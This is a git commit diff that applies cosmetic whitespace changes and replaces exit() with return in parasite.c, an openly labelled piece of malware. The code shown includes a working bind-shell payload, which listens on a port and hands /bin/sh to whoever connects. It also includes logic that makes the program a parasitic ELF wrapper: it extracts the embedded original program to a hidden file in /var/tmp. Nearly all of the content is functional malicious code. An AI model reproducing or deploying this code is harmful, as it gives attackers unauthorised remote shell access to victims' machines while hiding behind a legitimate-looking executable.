d3d3ca5850231538ee4118b49117a8997f5b4676
Daniel Roberson <daniel@planethacker.net>
2017-04-02 19:57:57 -0700

    whitespace cleanup, replaced exit() calls with returns

--- parasite.c
+++ parasite.c
@@ -28,7 +28,7 @@
 #define TEMPFILE "/var/tmp/.987151jh1u890ykjqu1351kjhf8y1"
 
 
-int main(int argc, char *argv[], char *envp[]) {
+int main (int argc, char *argv[], char *envp[]) {
   int parasite;
   int orig;
   int len;
@@ -39,78 +39,79 @@ int main(int argc, char *argv[], char *envp[]) {
 
 
   /* Start of malicious payload. Feel free to change this. */
-  if (fork() == 0) {
+  if (fork () == 0) {
     int s, c;
     struct sockaddr_in bindshell;
  
     bindshell.sin_family = AF_INET;
     bindshell.sin_addr.s_addr = INADDR_ANY;
-    bindshell.sin_port = htons(PORT);
+    bindshell.sin_port = htons (PORT);
     
-    s = socket(AF_INET, SOCK_STREAM, 0);
+    s = socket (AF_INET, SOCK_STREAM, 0);
 
-    bind(s, (struct sockaddr*)&bindshell, sizeof(bindshell));
-    listen(s, 0);
+    bind (s, (struct sockaddr*)&bindshell, sizeof (bindshell));
+    listen (s, 0);
 
-    c = accept(s, NULL, NULL);
+    c = accept (s, NULL, NULL);
 
-    dup2(c, STDERR_FILENO);
-    dup2(c, STDOUT_FILENO);
-    dup2(c, STDIN_FILENO);
+    dup2 (c, STDERR_FILENO);
+    dup2 (c, STDOUT_FILENO);
+    dup2 (c, STDIN_FILENO);
 
-    execl("/bin/sh", "sh", NULL);
+    execl ("/bin/sh", "sh", NULL);
   }
   /* End of malicious payload */
 
   /* Try to open current program for reading */
-  if ((parasite = open("/proc/self/exe", O_RDONLY)) < 0) {
-    exit(EXIT_FAILURE);
+  if ((parasite = open ("/proc/self/exe", O_RDONLY)) < 0) {
+    return EXIT_FAILURE;
   }
   
-  if (fstat(parasite, &self) < 0) {
-    exit(EXIT_FAILURE);
+  if (fstat (parasite, &self) < 0) {
+    return EXIT_FAILURE;
   }
 
   /* Read executable into memory */
   len = self.st_size;
 
-  buf = malloc(len);
+  buf = malloc (len);
   if (buf == NULL) {
-    exit(EXIT_FAILURE);
+    return EXIT_FAILURE;
   }
 
   /* Skip first ELF header */
-  if (lseek(parasite, sizeof(needle), SEEK_SET) != sizeof(needle)) {
-    exit(EXIT_FAILURE);
+  if (lseek (parasite, sizeof (needle), SEEK_SET) != sizeof (needle)) {
+    return EXIT_FAILURE;
   }
-  if (read(parasite, buf, len - sizeof(needle)) != len - sizeof(needle)) {
-    exit(EXIT_FAILURE);
+  if (read (parasite, buf, len - sizeof (needle)) != len - sizeof (needle)) {
+    return EXIT_FAILURE;
   }
 
   /* Calculate offset to second ELF header */
-  buf2 = memmem(buf, len - sizeof(needle), needle, sizeof(needle));
+  buf2 = memmem (buf, len - sizeof (needle), needle, sizeof (needle));
   if (buf2 == NULL) {
-    exit(EXIT_FAILURE);
+    return EXIT_FAILURE;
   }
 
-  offset = (long)buf2 - (long)buf + strlen(needle);
+  offset = (long)buf2 - (long)buf + strlen (needle);
 
   /* Write copy of original file to TEMPFILE */
-  if (lseek(parasite, offset, SEEK_SET) != offset) {
-    exit(EXIT_FAILURE);
+  if (lseek (parasite, offset, SEEK_SET) != offset) {
+    return EXIT_FAILURE;
   }
 
-  if (read(parasite, buf, len - offset) != len - offset) {
-    exit(EXIT_FAILURE);
-  }
-  close(parasite);
-
-  if ((orig = open(TEMPFILE, O_RDWR | O_CREAT | O_TRUNC, self.st_mode)) < 0) {
-    exit(EXIT_FAILURE);
+  if (read (parasite, buf, len - offset) != len - offset) {
+    return EXIT_FAILURE;
   }
 
-  if (write(orig, buf, len) != len) {
-    exit(EXIT_FAILURE);
+  close (parasite);
+
+  if ((orig = open (TEMPFILE, O_RDWR | O_CREAT | O_TRUNC, self.st_mode)) < 0) {
+    return EXIT_FAILURE;
+  }
+
+  if (write (orig, buf, len) != len) {
+    return EXIT_FAILURE;
   }
   
   free(buf);
